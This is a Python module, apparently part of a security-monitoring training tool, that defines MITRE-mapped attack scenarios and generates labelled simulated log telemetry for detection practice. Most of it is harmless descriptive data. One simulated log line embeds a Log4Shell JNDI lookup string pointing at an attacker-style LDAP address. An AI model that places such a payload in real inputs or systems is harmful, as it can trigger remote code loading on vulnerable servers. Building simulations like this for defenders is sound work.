"""
Safe Attack Simulation Scenarios.
Educational-only sandboxed simulations that generate realistic log telemetry.
NO real malware or offensive capabilities - everything is simulated data.
"""
import random
from datetime import datetime, timezone

SCENARIOS = {
    "brute_force_attack": {
        "name": "SSH Brute Force Attack",
        "description": "Simulates an SSH brute force attack from an external IP against a Linux server",
        "attack_type": "brute_force",
        "mitre_tactic": "Credential Access",
        "mitre_technique": "T1110",
        "mitre_technique_name": "Brute Force",
        "steps": [
            {"action": "recon", "detail": "Port scan target for SSH (22)"},
            {"action": "attack", "detail": "Attempt 50+ password combinations"},
            {"action": "success", "detail": "Successful login with guessed credentials"},
            {"action": "persist", "detail": "Add SSH key to authorized_keys"},
        ],
    },
    "phishing_campaign": {
        "name": "Spearphishing Campaign",
        "description": "Simulates a targeted phishing email campaign with malicious attachments",
        "attack_type": "phishing",
        "mitre_tactic": "Initial Access",
        "mitre_technique": "T1566",
        "mitre_technique_name": "Phishing",
        "steps": [
            {"action": "recon", "detail": "Gather target email addresses from OSINT"},
            {"action": "craft", "detail": "Create convincing phishing email with macro-enabled doc"},
            {"action": "deliver", "detail": "Send phishing emails to 10 targets"},
            {"action": "exploit", "detail": "Victim opens attachment, macro executes"},
        ],
    },
    "lateral_movement": {
        "name": "Lateral Movement via RDP",
        "description": "Simulates attacker moving laterally through the network using compromised credentials",
        "attack_type": "lateral_movement",
        "mitre_tactic": "Lateral Movement",
        "mitre_technique": "T1021",
        "mitre_technique_name": "Remote Services",
        "steps": [
            {"action": "cred_dump", "detail": "Dump credentials from LSASS memory"},
            {"action": "enumerate", "detail": "Discover accessible hosts via SMB"},
            {"action": "move", "detail": "RDP to file server with admin credentials"},
            {"action": "persist", "detail": "Create new service for persistence"},
        ],
    },
    "data_exfiltration": {
        "name": "Data Exfiltration via DNS",
        "description": "Simulates data exfiltration using DNS tunneling",
        "attack_type": "exfiltration",
        "mitre_tactic": "Exfiltration",
        "mitre_technique": "T1048",
        "mitre_technique_name": "Exfiltration Over Alternative Protocol",
        "steps": [
            {"action": "discover", "detail": "Locate sensitive files on file shares"},
            {"action": "stage", "detail": "Compress and encode data for exfil"},
            {"action": "exfil", "detail": "Exfiltrate data via DNS TXT queries"},
            {"action": "cleanup", "detail": "Clear event logs and artifacts"},
        ],
    },
    "ransomware_simulation": {
        "name": "Ransomware Attack Chain",
        "description": "Simulates a full ransomware kill chain from initial access to impact",
        "attack_type": "ransomware",
        "mitre_tactic": "Impact",
        "mitre_technique": "T1486",
        "mitre_technique_name": "Data Encrypted for Impact",
        "steps": [
            {"action": "initial_access", "detail": "Phishing email delivers dropper"},
            {"action": "execution", "detail": "PowerShell downloads ransomware payload"},
            {"action": "escalation", "detail": "Escalate to SYSTEM via service exploit"},
            {"action": "lateral", "detail": "Spread to 5 workstations via SMB"},
            {"action": "encrypt", "detail": "Simulate file encryption on all hosts"},
        ],
    },
    "reverse_shell": {
        "name": "Reverse Shell Simulation",
        "description": "Simulates establishing a reverse shell connection back to attacker C2",
        "attack_type": "command_and_control",
        "mitre_tactic": "Execution",
        "mitre_technique": "T1059",
        "mitre_technique_name": "Command and Scripting Interpreter",
        "steps": [
            {"action": "exploit", "detail": "Exploit web application vulnerability"},
            {"action": "shell", "detail": "Establish reverse shell to C2 server"},
            {"action": "enumerate", "detail": "Run system enumeration commands"},
            {"action": "persist", "detail": "Drop persistence mechanism"},
        ],
    },
    "apt_killchain_multihop": {
        "name": "APT Advanced Killchain (Multi-Hop)",
        "description": "Simulates an advanced persistent threat exploiting Log4Shell, moving laterally to a Domain Controller, and exfiltrating data via a Tor-style multi-hop tunnel.",
        "attack_type": "apt_campaign",
        "mitre_tactic": "Multiple",
        "mitre_technique": "T1190, T1210, T1090",
        "mitre_technique_name": "Exploit Public-Facing App, Remote Services, Exfil Over Alt Protocol",
        "steps": [
            {"action": "recon", "detail": "Identify vulnerable web service (Log4j)"},
            {"action": "initial_access", "detail": "Exploit CVE-2021-44228 (Log4Shell) on Web Server"},
            {"action": "c2", "detail": "Establish encrypted reverse shell"},
            {"action": "lateral", "detail": "Pivot and exploit CVE-2020-1472 (ZeroLogon) on Domain Controller"},
            {"action": "collection", "detail": "Dump AD credentials (NTDS.dit)"},
            {"action": "exfil", "detail": "Exfiltrate data via multi-hop routing tunnel (Tor-style)"},
        ],
    },
}


def get_scenarios():
    """Return all available attack scenarios."""
    return [
        {"id": k, "name": v["name"], "description": v["description"],
         "attack_type": v["attack_type"], "mitre_technique": v["mitre_technique"],
         "mitre_technique_name": v["mitre_technique_name"]}
        for k, v in SCENARIOS.items()
    ]


def get_scenario_detail(scenario_id: str):
    """Return detailed info for a specific scenario."""
    return SCENARIOS.get(scenario_id)


def generate_simulation_logs(scenario_id: str, db=None) -> list[dict]:
    """Generate a burst of logs that simulate the attack scenario."""
    scenario = SCENARIOS.get(scenario_id)
    if not scenario:
        return []

    logs = []
    
    # Default random IPs
    src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    dst_ip = f"10.0.{random.randint(1,5)}.{random.randint(1,254)}"
    
    web_srv_ip = "10.0.3.40"  # Fallback
    dc_ip = "10.0.1.10"       # Fallback
    
    if db:
        from backend.models.asset import Asset
        web_asset = db.query(Asset).filter(Asset.hostname == "WEB-SRV01").first()
        if web_asset: web_srv_ip = web_asset.ip_address
        
        dc_asset = db.query(Asset).filter(Asset.hostname == "DC01").first()
        if dc_asset: dc_ip = dc_asset.ip_address

    def base_log(step: dict) -> dict:
        return {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "source": "attack_simulation",
            "source_ip": src_ip,
            "destination_ip": dst_ip,
            "event_type": f"sim_{step['action']}",
            "severity": "critical",
            "hostname": f"target-{random.choice(['srv01','ws01','dc01'])}",
            "username": "attacker",
            "raw_log": f"[SIMULATION] {scenario['name']} - Step: {step['action']} - {step['detail']}",
            "mitre_tactic": scenario["mitre_tactic"],
            "mitre_technique": scenario["mitre_technique"],
            "mitre_technique_name": scenario["mitre_technique_name"],
            "is_malicious": 2,
        }

    for step in scenario["steps"]:
        log = base_log(step)

        if scenario_id == "apt_killchain_multihop":
            if step["action"] == "recon":
                log.update({
                    "source": "network", "event_type": "port_scan", "destination_ip": web_srv_ip,
                    "mitre_tactic": "Reconnaissance", "mitre_technique": "T1595", "mitre_technique_name": "Active Scanning",
                    "raw_log": f"[SIMULATION] Network sweep targeting {web_srv_ip}: {step['detail']}",
                })
            elif step["action"] == "initial_access":
                log.update({
                    "source": "linux", "event_type": "exploit_public_app", "destination_ip": web_srv_ip, "hostname": "WEB-SRV01",
                    "mitre_tactic": "Initial Access", "mitre_technique": "T1190", "mitre_technique_name": "Exploit Public-Facing Application",
                    "raw_log": f"[SIMULATION] Exploit CVE-2021-44228 payload received on {web_srv_ip}: ${{jndi:ldap://{src_ip}/a}}",
                })
            elif step["action"] == "c2":
                log.update({
                    "source": "network", "event_type": "c2_beacon", "source_ip": web_srv_ip, "destination_ip": src_ip,
                    "mitre_tactic": "Command and Control", "mitre_technique": "T1071.001", "mitre_technique_name": "Web Protocols",
                    "raw_log": f"[SIMULATION] Encrypted reverse shell established from {web_srv_ip} to {src_ip}",
                })
            elif step["action"] == "lateral":
                log.update({
                    "source": "network", "event_type": "lateral_movement", "source_ip": web_srv_ip, "destination_ip": dc_ip, "protocol": "RPC",
                    "mitre_tactic": "Lateral Movement", "mitre_technique": "T1210", "mitre_technique_name": "Exploitation of Remote Services",
                    "raw_log": f"[SIMULATION] CVE-2020-1472 (ZeroLogon) exploitation attempt from {web_srv_ip} against {dc_ip}",
                })
            elif step["action"] == "collection":
                log.update({
                    "source": "windows", "event_type": "credential_dumping", "source_ip": dc_ip, "hostname": "DC01",
                    "mitre_tactic": "Credential Access", "mitre_technique": "T1003.003", "mitre_technique_name": "NTDS",
                    "raw_log": f"[SIMULATION] NTDS.dit exfiltration prepared on {dc_ip}",
                })
            elif step["action"] == "exfil":
                log.update({
                    "source": "network", "event_type": "multi_hop_exfil", "source_ip": web_srv_ip, "destination_ip": "185.10.10.20",
                    "mitre_tactic": "Exfiltration", "mitre_technique": "T1090.003", "mitre_technique_name": "Multi-hop Proxy",
                    "raw_log": f"[SIMULATION] High volume data exfiltrated via Tor-style multi-hop tunnel from {web_srv_ip}: {step['detail']}",
                })
        
        # ... Keep existing rules for reverse_shell, ransomware, etc. ...
        
        logs.append(log)
    return logs
